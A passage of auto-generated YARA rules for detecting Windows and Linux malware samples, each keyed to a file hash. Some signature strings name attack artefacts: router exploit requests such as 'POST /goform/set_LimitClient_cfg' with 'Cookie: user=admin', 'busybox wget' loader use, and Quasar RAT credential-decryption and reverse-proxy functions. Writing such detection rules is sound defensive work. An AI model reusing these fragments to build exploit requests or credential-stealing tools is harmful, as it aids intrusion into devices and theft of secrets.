        $s19 = "POST /goform/set_LimitClient_cfg HTTP/1.1"
        $s20 = "Cookie: user=admin"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 145KB and
        all of them
}

rule Windows_9e3adf4d29ff613f70e43fd757589ade8407b408eb3784e853e01bf067234eed
{
    meta:
        description = "Auto ML: 9e3adf4d29ff613f70e43fd757589ade8407b408eb3784e853e01bf067234eed"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "NewInstance"
        $s6 = "kernel32.dll"
        $s7 = "SetDllDirectoryW"
        $s8 = "SetSearchPathMode"
        $s9 = "SetProcessDEPPolicy"
        $s10 = "TEMP"
        $s11 = "USERPROFILE"
        $s12 = "GetUserDefaultUILanguage"
        $s13 = "TCustomFile"
        $s14 = "TFile"
        $s15 = "EFileError"
        $s16 = "File I/O error %d"
        $s17 = "TCompressedBlockReader"
        $s18 = "TSetupLanguageEntryA"
        $s19 = "The setup files are corrupted. Please obtain a new copy of the program."
        $s20 = "shell32.dll"
    condition:
        uint32(0) == 0x00505a4d and
        filesize < 6687KB and
        all of them
}

rule Windows_9e682a45b78d5a76d6afe9c523a1900d816edbabfecd9fb93165e9b26e694f4f
{
    meta:
        description = "Auto ML: 9e682a45b78d5a76d6afe9c523a1900d816edbabfecd9fb93165e9b26e694f4f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = ":uWINgDSq^"
        $s5 = "GCMDw"
        $s6 = "MecmD"
        $s7 = "System.IO"
        $s8 = "System.Collections.Generic"
        $s9 = "add_Load"
        $s10 = "get_IndianRed"
        $s11 = "get_Enabled"
        $s12 = "set_Enabled"
        $s13 = "set_FormattingEnabled"
        $s14 = "get_IsCompleted"
        $s15 = "get_highSchoolGrade"
        $s16 = "set_highSchoolGrade"
        $s17 = "set_AutoScaleMode"
        $s18 = "set_ColumnHeadersHeightSizeMode"
        $s19 = "get_Message"
        $s20 = "GetTypeFromHandle"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 521KB and
        all of them
}

rule Windows_9e6fa1f280864e2933528e17984bf2d448b003bda842145f34e63cc8a4b337ef
{
    meta:
        description = "Auto ML: 9e6fa1f280864e2933528e17984bf2d448b003bda842145f34e63cc8a4b337ef"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "!setybdeta}"
        $s5 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet"
        $s6 = "PGma.System.MouseKeyHook, Version=5.6.130.0, Culture=neutral, PublicKeyToken=null"
        $s7 = "DQuasar.Common, Version=1.4.1.0, Culture=neutral, PublicKeyToken=null"
        $s8 = "SetEofOn00"
        $s9 = "<GetPacketTypes>b__3_0"
        $s10 = "<WinSCPDecrypt>b__4_0"
        $s11 = "OffsetMAIN_0"
        $s12 = "<GetReverseProxyByConnectionId>b__0"
        $s13 = "<GetKeyValues>b__0"
        $s14 = "<Process>b__0"
        $s15 = "get_Scan0"
        $s16 = "ProcessCrlB1"
        $s17 = "MicrosoftCertTemplateV1"
        $s18 = "get_KnowledgeProofForX1"
        $s19 = "Http_1_1"
        $s20 = "<GetKeyValues>b__15_1"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 3190KB and
        all of them
}

rule Windows_9e900bf1cc6d62045a6e460c8f366c7c062cb5357d21029e9733f5926a8770fd
{
    meta:
        description = "Auto ML: 9e900bf1cc6d62045a6e460c8f366c7c062cb5357d21029e9733f5926a8770fd"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "USERENV"
        $s6 = "SETUPAPI"
        $s7 = "RegSetValueExW"
        $s8 = "RegCloseKey"
        $s9 = "RegDeleteValueW"
        $s10 = "RegDeleteKeyW"
        $s11 = "OpenProcessToken"
        $s12 = "RegOpenKeyExW"
        $s13 = "RegCreateKeyExW"
        $s14 = "ADVAPI32.dll"
        $s15 = "SHFileOperationW"
        $s16 = "SHGetFileInfoW"
        $s17 = "SHGetPathFromIDListW"
        $s18 = "ShellExecuteExW"
        $s19 = "SHELL32.dll"
        $s20 = "CoCreateInstance"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2410KB and
        all of them
}

rule Windows_9e9d1ce30d8beb027b25d7bd48023324fcdbbb26dffad6b5ff49e1f8ae700d82
{
    meta:
        description = "Auto ML: 9e9d1ce30d8beb027b25d7bd48023324fcdbbb26dffad6b5ff49e1f8ae700d82"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "<Module>"
        $s5 = "get_pWIF"
        $s6 = "get_ImagenURL"
        $s7 = "set_ImagenURL"
        $s8 = "get_Marca"
        $s9 = "set_Marca"
        $s10 = "get_Categoria"
        $s11 = "set_Categoria"
        $s12 = "System.Data"
        $s13 = "setearConsulta"
        $s14 = "System.Collections.Generic"
        $s15 = "Read"
        $s16 = "add_Load"
        $s17 = "frmConSettings_Load"
        $s18 = "set_AutoScaleMode"
        $s19 = "set_SizeMode"
        $s20 = "set_Image"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 712KB and
        all of them
}

rule Windows_9eabf4c63eb61d6f57d39f04f1cef92117318a04731b8f61f6139d1600d092fd
{
    meta:
        description = "Auto ML: 9eabf4c63eb61d6f57d39f04f1cef92117318a04731b8f61f6139d1600d092fd"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "FlsSetValue"
        $s6 = "FlsGetValue"
        $s7 = "CorExitProcess"
        $s8 = "An application has made an attempt to load the C runtime library incorrectly."
        $s9 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s10 = "- Attempt to initialize the CRT more than once."
        $s11 = "- unable to open console device"
        $s12 = "- unexpected multithread lock error"
        $s13 = "- not enough space for thread data"
        $s14 = "- floating point support not loaded"
        $s15 = "`local static thread guard'"
        $s16 = "`placement delete[] closure'"
        $s17 = "`placement delete closure'"
        $s18 = "delete[]"
        $s19 = "delete"
        $s20 = "`non-type-template-parameter"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 252KB and
        all of them
}

rule Windows_9efc56963653ce8b7f63f767d39b32d72bbf8d318de43c4434002b853e3728eb
{
    meta:
        description = "Auto ML: 9efc56963653ce8b7f63f767d39b32d72bbf8d318de43c4434002b853e3728eb"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "@.rsrc"
        $s5 = "@.reloc"
        $s6 = "keO3AoQMCzr,System.Private.CoreLib"
        $s7 = "4System.Private.CoreLib.dll"
        $s8 = "4System.Diagnostics.Process"
        $s9 = "<System.Diagnostics.Process.dll"
        $s10 = "@System.ComponentModel.Primitives"
        $s11 = "HSystem.ComponentModel.Primitives.dll"
        $s12 = "$System.ObjectModel"
        $s13 = ",System.ObjectModel.dll"
        $s14 = "System.Linq"
        $s15 = "System.Linq.dll"
        $s16 = "System"
        $s17 = "System.dllFSystem.ComponentModel.TypeConverter"
        $s18 = "NSystem.ComponentModel.TypeConverter.dll"
        $s19 = ":System.Collections.NonGeneric"
        $s20 = "BSystem.Collections.NonGeneric.dll"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5252KB and
        all of them
}

rule Windows_9f03fa5d064cc8b7891502834a7737ce015d3a23a6eae3793481014f6cf73131
{
    meta:
        description = "Auto ML: 9f03fa5d064cc8b7891502834a7737ce015d3a23a6eae3793481014f6cf73131"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "System.Runtime.CompilerServices"
        $s5 = "System"
        $s6 = "System.Diagnostics"
        $s7 = "System.Reflection"
        $s8 = "System.Runtime.InteropServices"
        $s9 = "AssemblyFileVersionAttribute"
        $s10 = "TargetFrameworkAttribute"
        $s11 = "System.Runtime.Versioning"
        $s12 = "System.Resources"
        $s13 = "AssemblyKeyFileAttribute"
        $s14 = "exercises_with_the_training_complex.exe"
        $s15 = "<Module>"
        $s16 = "ThreadSafeObjectProvider`1"
        $s17 = "MySettings"
        $s18 = "ApplicationSettingsBase"
        $s19 = "System.Configuration"
        $s20 = "MySettingsProperty"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 4980KB and
        all of them
}

rule Linux_108615c0884401ca10eb2a9cf205766e2554e0001c7c67570e19d20254362bf8
{
    meta:
        description = "Auto ML: 108615c0884401ca10eb2a9cf205766e2554e0001c7c67570e19d20254362bf8"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36"
        $s2 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36"
        $s3 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36"
        $s4 = "PATCH /%s HTTP/1.1"
        $s5 = "User-Agent: %s"
        $s6 = "Connection: close"
        $s7 = "OpenSuse"
        $s8 = "OpenWRT"
        $s9 = "No such file or directory"
        $s10 = "No such process"
        $s11 = "Interrupted system call"
        $s12 = "Bad file descriptor"
        $s13 = "No child processes"
        $s14 = "Resource temporarily unavailable"
        $s15 = "File exists"
        $s16 = "Too many open files in system"
        $s17 = "Too many open files"
        $s18 = "Text file busy"
        $s19 = "File too large"
        $s20 = "Read-only file system"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 107KB and
        all of them
}

rule Linux_9f0a21abb820c48fff9be30e033b888d392c26143d5950a3b65ff739d2203711
{
    meta:
        description = "Auto ML: 9f0a21abb820c48fff9be30e033b888d392c26143d5950a3b65ff739d2203711"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "M-SEARCH * HTTP/1.1"
        $s2 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows"
        $s3 = "Windows XP"
        $s4 = "HTTP/1.1 404 Not Found"
        $s5 = "HTTP/1.1 200 OK"
        $s6 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1"
        $s7 = "Connection: keep-alive"
        $s8 = "/proc/%d/cmdline"
        $s9 = "busybox wget"
        $s10 = "/usr/lib/systemd/systemd"
        $s11 = "/usr/libexec/openssh/sftp-server"
        $s12 = "shell"
        $s13 = "httpd"
        $s14 = "system"
        $s15 = "wget-log"
        $s16 = "1337SoraLOADER"
        $s17 = "nloads"
        $s18 = "elfLoad"
        $s19 = "POST /goform/set_LimitClient_cfg HTTP/1.1"
        $s20 = "Cookie: user=admin"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 142KB and
        all of them
}

rule Windows_9f2bfb93647496f466b54b7b5405db565fb23b51b71f0fd97d034b24113d4b93
{
    meta:
        description = "Auto ML: 9f2bfb93647496f466b54b7b5405db565fb23b51b71f0fd97d034b24113d4b93"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "@.rsrc"
        $s5 = "@.reloc"
        $s6 = "Failed to extract %s: failed to allocate temporary input buffer!"
        $s7 = "Failed to extract %s: failed to allocate temporary output buffer!"
        $s8 = "Failed to extract %s: failed to allocate temporary buffer!"
        $s9 = "Failed to extract %s: failed to read data chunk!"
        $s10 = "fread"
        $s11 = "Failed to extract %s: failed to write data chunk!"
        $s12 = "fwrite"
        $s13 = "Failed to extract %s: failed to open archive file!"
        $s14 = "pyi_arch_extract2fs was called before temporary directory was initialized!"
        $s15 = "Failed to create symbolic link %s!"
        $s16 = "Failed to extract %s: failed to open target file!"
        $s17 = "fopen"
        $s18 = "Failed to read cookie!"
        $s19 = "Could not read full TOC!"
        $s20 = "Error on file."
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 7166KB and
        all of them
}

rule Linux_9f48a3bdfe0cc51c921a110a22d044e3017c428129b02895d3ad1e88b86853ea
{
    meta:
        description = "Auto ML: 9f48a3bdfe0cc51c921a110a22d044e3017c428129b02895d3ad1e88b86853ea"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "HTTP/1.1"
        $s2 = "User-Agent:"
        $s3 = "http"
        $s4 = "HTTP/1.1 404 Not Found"
        $s5 = "HTTP/1.1 200 OK"
        $s6 = "/bin/systemd"
        $s7 = "GET /%s HTTP/1.0"
        $s8 = "User-Agent: Update v1.0"
        $s9 = "No such file or directory"
        $s10 = "No such process"
        $s11 = "Interrupted system call"
        $s12 = "Bad file descriptor"
        $s13 = "No child processes"
        $s14 = "Resource temporarily unavailable"
        $s15 = "File exists"
        $s16 = "Too many open files in system"
        $s17 = "Too many open files"
        $s18 = "Text file busy"
        $s19 = "File too large"
        $s20 = "Read-only file system"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 83KB and
        all of them
}

rule Windows_9f8c457038dec8b3ce15996b078008bd5ec3d817b969da6bce8c6902a513d225
{
    meta:
        description = "Auto ML: 9f8c457038dec8b3ce15996b078008bd5ec3d817b969da6bce8c6902a513d225"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "P`.data"
        $s3 = ".rdata"
        $s4 = ".rsrc"
        $s5 = "libgcc_s_dw2-1.dll"
        $s6 = "DeleteCriticalSection"
        $s7 = "GetCurrentProcess"
        $s8 = "GetCurrentProcessId"
        $s9 = "GetCurrentThreadId"
        $s10 = "GetLastError"
        $s11 = "GetModuleHandleA"
        $s12 = "GetProcAddress"
        $s13 = "GetStartupInfoA"
        $s14 = "GetSystemTimeAsFileTime"
        $s15 = "GetTickCount"
        $s16 = "LoadLibraryA"
        $s17 = "SetUnhandledExceptionFilter"
        $s18 = "TerminateProcess"
        $s19 = "TlsGetValue"
        $s20 = "__getmainargs"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 24KB and
        all of them
}

rule Linux_9fb8dda8f6fc2cd2b0839f18a08ab7d10bf2a6a4092201d00075438d4f6c22b6
{
    meta:
        description = "Auto ML: 9fb8dda8f6fc2cd2b0839f18a08ab7d10bf2a6a4092201d00075438d4f6c22b6"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "HTTP/1.1"
        $s2 = "User-Agent:"
        $s3 = "http"
        $s4 = ".text"
        $s5 = ".data"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 73KB and
        all of them
}

rule Linux_9fd2f8e4d8c7fda38a736de0f34b41a38c0be7fb1456803ba501db4153efa9e3
{
    meta:
        description = "Auto ML: 9fd2f8e4d8c7fda38a736de0f34b41a38c0be7fb1456803ba501db4153efa9e3"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "M-SEARCH * HTTP/1.1"
        $s2 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows"
        $s3 = "Windows XP"
        $s4 = "socket:["
        $s5 = ".text"
        $s6 = ".data"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 50KB and
        all of them
}

rule Windows_9fedab2bb4115b0afcd184c958283df5b436cbf800fb9de2678719bf9071d9f5
{
    meta:
        description = "Auto ML: 9fedab2bb4115b0afcd184c958283df5b436cbf800fb9de2678719bf9071d9f5"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "get_Label100"
        $s5 = "set_Label100"
        $s6 = "get_Button100"
        $s7 = "set_Button100"
        $s8 = "get_TextBox100"
        $s9 = "set_TextBox100"
        $s10 = "get_Button110"
        $s11 = "set_Button110"
        $s12 = "get_TextBox110"
        $s13 = "set_TextBox110"
        $s14 = "get_TabPage10"
        $s15 = "set_TabPage10"
        $s16 = "get_Label10"
        $s17 = "set_Label10"
        $s18 = "get_Button10"
        $s19 = "set_Button10"
        $s20 = "get_RadioButton10"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 607KB and
        all of them
}

rule Windows_a05b3641cca29aead4899ddbf33718b54b209fc06c5c9483162264ee52511ba7
{
    meta:
        description = "Auto ML: a05b3641cca29aead4899ddbf33718b54b209fc06c5c9483162264ee52511ba7"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "CorExitProcess"
        $s6 = "An application has made an attempt to load the C runtime library incorrectly."
        $s7 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s8 = "- Attempt to initialize the CRT more than once."
        $s9 = "- unable to open console device"
        $s10 = "- unexpected multithread lock error"
        $s11 = "- not enough space for thread data"
        $s12 = "- floating point support not loaded"
        $s13 = "FlsSetValue"
        $s14 = "FlsGetValue"
        $s15 = "GAIsProcessorFeaturePresent"
        $s16 = "KERNEL32"
        $s17 = "GetProcessWindowStation"
        $s18 = "GetUserObjectInformationA"
        $s19 = "GetLastActivePopup"
        $s20 = "GetActiveWindow"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 232KB and
        all of them
}

rule Windows_a07acb9e54269e5554a96548c50337f564cbce39ffc4fa797438a05dd6d993dd
{
    meta:
        description = "Auto ML: a07acb9e54269e5554a96548c50337f564cbce39ffc4fa797438a05dd6d993dd"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet"
        $s5 = "FileN:am{"
        $s6 = "<Module>"
        $s7 = "ThreadSafeObjectProvider`1"
        $s8 = "System"
        $s9 = "get_Computer"
        $s10 = "get_Application"
        $s11 = "User"
        $s12 = "get_User"
        $s13 = "m_UserObjectProvider"
        $s14 = "get_WebServices"
        $s15 = "GetHashCode"
        $s16 = "GetType"
        $s17 = "Create__Instance__"
        $s18 = "get_GetInstance"
        $s19 = "m_ThreadStaticValue"
        $s20 = "GetInstance"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 3424KB and
        all of them
}

rule Windows_a07c09068aad2ec47ece4b529dea840125654f551429c331f67b34833ba84110
{
    meta:
        description = "Auto ML: a07c09068aad2ec47ece4b529dea840125654f551429c331f67b34833ba84110"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "NewInstance"
        $s6 = "kernel32.dll"
        $s7 = "SetDllDirectoryW"
        $s8 = "SetSearchPathMode"
        $s9 = "SetProcessDEPPolicy"
        $s10 = "TEMP"
        $s11 = "USERPROFILE"
        $s12 = "GetUserDefaultUILanguage"
        $s13 = "TCustomFile"
        $s14 = "TFile"
        $s15 = "EFileError"
        $s16 = "File I/O error %d"
        $s17 = "TCompressedBlockReader"
        $s18 = "TSetupLanguageEntryA"
        $s19 = "The setup files are corrupted. Please obtain a new copy of the program."
        $s20 = "shell32.dll"
    condition:
        uint32(0) == 0x00505a4d and
        filesize < 6685KB and
        all of them
}

rule Windows_10b43fb2634085b6ab64fc9f92be8727a8b0162eb74341297a23f9bdbd89ecd1
{
    meta:
        description = "Auto ML: 10b43fb2634085b6ab64fc9f92be8727a8b0162eb74341297a23f9bdbd89ecd1"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "get_Panel1"
        $s5 = "get_Panel2"
        $s6 = "<Module>"
        $s7 = "get_GUID"
        $s8 = "set_GUID"
        $s9 = "get_ASCII"
        $s10 = "get_QiqK"
        $s11 = "System.IO"
        $s12 = "System.Data"
        $s13 = "SetupRecordingsData"
        $s14 = "SetupEventsData"
        $s15 = "System.Collections.Generic"
        $s16 = "Read"
        $s17 = "Thread"
        $s18 = "Load"
        $s19 = "fileSystemWatcher1_Changed"
        $s20 = "chkBoxProcessSchedule_CheckedChanged"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 685KB and
        all of them
}

rule Linux_a07e42a6c632f85095e7cc6f87268df742ead45854ca5a65a8d7492d08e76bbc
{
    meta:
        description = "Auto ML: a07e42a6c632f85095e7cc6f87268df742ead45854ca5a65a8d7492d08e76bbc"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "http://"
        $s2 = "https://"
        $s3 = "/ (deleted)"
        $s4 = "/lib/systemd/"
        $s5 = "/system/system/bin/"
        $s6 = "/data/module/jdk"
        $s7 = "No such file or directory"
        $s8 = "No such process"
        $s9 = "Interrupted system call"
        $s10 = "Bad file descriptor"
        $s11 = "No child processes"
        $s12 = "Resource temporarily unavailable"
        $s13 = "File exists"
        $s14 = "Too many open files in system"
        $s15 = "Too many open files"
        $s16 = "Text file busy"
        $s17 = "File too large"
        $s18 = "Read-only file system"
        $s19 = "File name too long"
        $s20 = "Level 3 reset"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 106KB and
        all of them
}

rule Windows_a09597f979954024fbd12b32dbbfe982d7ca8057b5271126acba68202fd9feaa
{
    meta:
        description = "Auto ML: a09597f979954024fbd12b32dbbfe982d7ca8057b5271126acba68202fd9feaa"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.data"
        $s3 = ".rsrc"
        $s4 = "MSVBVM60.DLL"
        $s5 = "nInstall, Setup or Update"
        $s6 = "This sets the present colors as default. When you restart, these will be the colors that appear."
        $s7 = "This resets the default colors. When you restart, these will be the colors that appear."
        $s8 = "This sets the size as the default. Use it to create shapes of the same size."
        $s9 = "MSComDlg.CommonDialog"
        $s10 = "Toggle Display Window"
        $s11 = "ConnectingLine"
        $s12 = "mnuFile"
        $s13 = "&File"
        $s14 = "mnuOpen"
        $s15 = "&Open..."
        $s16 = "ReadyState"
        $s17 = "Shdocvw.dll"
        $s18 = "OWC11.Spreadsheet"
        $s19 = "Spreadsheet"
        $s20 = "WindowEditor"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5252KB and
        all of them
}

rule Windows_a0a8bde092f8f6f346839e2862d03749d730f274369bb7bb11c1263e7ee6ec95
{
    meta:
        description = "Auto ML: a0a8bde092f8f6f346839e2862d03749d730f274369bb7bb11c1263e7ee6ec95"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "System.Reflection"
        $s5 = "System"
        $s6 = "TargetFrameworkAttribute"
        $s7 = "System.Runtime.Versioning"
        $s8 = "System.Runtime.InteropServices"
        $s9 = "System.Runtime.CompilerServices"
        $s10 = "AssemblyFileVersionAttribute"
        $s11 = "System.Diagnostics"
        $s12 = "History.exe"
        $s13 = "<Module>"
        $s14 = "<Module>{06FB0A8E-4CED-498C-AC89-AD4B34AA4700}"
        $s15 = "<Module>{1bfc68a7-2843-434b-8707-0091bbdec352}"
        $s16 = "kernel32.dll"
        $s17 = "CreateRemoteThread"
        $s18 = "System.Threading.Tasks"
        $s19 = "Module"
        $s20 = "System.Collections.Generic"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 366KB and
        all of them
}

rule Windows_a0cb5554307e10606f04ea9ffa42b6e382bc874fe5a42be5347f91569de9f115
{
    meta:
        description = "Auto ML: a0cb5554307e10606f04ea9ffa42b6e382bc874fe5a42be5347f91569de9f115"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "USERENV"
        $s6 = "SETUPAPI"
        $s7 = "Software\\Microsoft\\Windows\\CurrentVersion"
        $s8 = "RegSetValueExA"
        $s9 = "RegCloseKey"
        $s10 = "RegDeleteValueA"
        $s11 = "RegDeleteKeyA"
        $s12 = "OpenProcessToken"
        $s13 = "RegOpenKeyExA"
        $s14 = "RegCreateKeyExA"
        $s15 = "ADVAPI32.dll"
        $s16 = "SHFileOperationA"
        $s17 = "SHGetFileInfoA"
        $s18 = "SHGetPathFromIDListA"
        $s19 = "ShellExecuteExA"
        $s20 = "SHELL32.dll"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 4438KB and
        all of them
}

rule Windows_a1a75a717953ccb8afbdba7f5dae113dba630c6c90820f927f41d28782ed483b
{
    meta:
        description = "Auto ML: a1a75a717953ccb8afbdba7f5dae113dba630c6c90820f927f41d28782ed483b"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "`.reloc"
        $s5 = "@.rsrc"
        $s6 = "ShellExecuteExW"
        $s7 = "ExitProcess"
        $s8 = "WTSAPI32.dll"
        $s9 = "SetThreadAffinityMask"
        $s10 = "GetProcessWindowStation"
        $s11 = "ewIN"
        $s12 = "GetModuleFileNameW"
        $s13 = "SetProcessAffinityMask"
        $s14 = "KERNEL32.dll"
        $s15 = "GetModuleHandleA"
        $s16 = "USER32.dll"
        $s17 = "SetClipboardData"
        $s18 = "ADVAPI32.dll"
        $s19 = "GetProcAddress"
        $s20 = "RNSEt"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 6467KB and
        all of them
}

rule Windows_a1ceabd5d93711c115e88096a4af5133382cd27df50b7cd412397fa16b96600a
{
    meta:
        description = "Auto ML: a1ceabd5d93711c115e88096a4af5133382cd27df50b7cd412397fa16b96600a"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "CorExitProcess"
        $s6 = "FlsSetValue"
        $s7 = "FlsGetValue"
        $s8 = "An application has made an attempt to load the C runtime library incorrectly."
        $s9 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s10 = "- Attempt to initialize the CRT more than once."
        $s11 = "- unable to open console device"
        $s12 = "- unexpected multithread lock error"
        $s13 = "- not enough space for thread data"
        $s14 = "- floating point support not loaded"
        $s15 = "GAIsProcessorFeaturePresent"
        $s16 = "KERNEL32"
        $s17 = "GetProcessWindowStation"
        $s18 = "GetUserObjectInformationA"
        $s19 = "GetLastActivePopup"
        $s20 = "GetActiveWindow"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 314KB and
        all of them
}

rule Windows_a1e1569dfcaedc7962d5af6fcb5b022b5faddeef372cd7458fd3f383e0dcd560
{
    meta:
        description = "Auto ML: a1e1569dfcaedc7962d5af6fcb5b022b5faddeef372cd7458fd3f383e0dcd560"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "Moyzenm.exe"
        $s5 = "<Module>"
        $s6 = "System"
        $s7 = "Bercsij.Common"
        $s8 = "ItemProcessorMock"
        $s9 = "<Module>{2b8a9028-7230-4feb-95cd-e5f8bcfab918}"
        $s10 = "processor"
        $s11 = "min_asset"
        $s12 = "System.Linq"
        $s13 = "System.Core"
